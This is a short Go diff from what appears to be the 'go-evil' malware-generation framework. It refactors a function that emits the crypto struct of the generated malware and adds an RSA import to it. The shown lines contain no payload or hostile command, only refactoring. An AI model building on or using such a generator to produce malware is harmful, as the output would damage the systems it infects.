@@ -1,14 +1,13 @@
 package structs
 
 import (
-	"github.com/TeamPhoneix/go-evil/utility/structure"
 	"github.com/TeamPhoneix/go-evil/utility/structure/functions"
+	"github.com/TeamPhoneix/go-evil/utility/structure/json"
 	"github.com/TeamPhoneix/go-evil/utility/structure/structs"
 )
 
 // Generates the crypto struct (read rib) of the malware
-func Generate_crypt(s_json string) string {
-	data_object := structure.Receive(s_json)
+func Generate_crypt(data_object *json.Json_t) {
 
 	data_object.Add_go_struct(structs.Go_struct_t{
 		Name: "crypt_t",
@@ -43,5 +42,4 @@ func Generate_crypt(s_json string) string {
 
 	data_object.Add_go_import("crypto/rsa")
 
-	return structure.Send(data_object)
 }
